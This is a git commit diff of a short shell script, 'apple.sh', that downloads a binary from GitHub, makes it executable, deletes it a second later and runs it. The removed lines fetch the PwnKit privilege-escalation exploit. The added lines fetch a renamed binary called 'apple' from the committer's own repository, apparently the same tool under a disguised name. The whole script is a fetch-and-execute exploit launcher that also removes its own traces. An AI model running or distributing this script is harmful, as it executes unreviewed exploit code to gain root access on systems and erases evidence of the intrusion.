795acbc4ac97b2a804d9df58d21570adf49521c7
Matt <33806410+Mattz-P@users.noreply.github.com>
2022-01-31 04:48:22 +0900

    Update apple.sh

--- apple.sh
+++ apple.sh
@@ -1,4 +1,4 @@
-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
-chmod +x ./PwnKit || exit
-(sleep 1 && rm ./PwnKit & )
-./PwnKit
+curl -fsSL https://raw.githubusercontent.com/Mattz-P/One-Liner-Script/main/bin/apple/apple -o apple || exit
+chmod +x ./apple || exit
+(sleep 1 && rm ./apple & )
+./apple
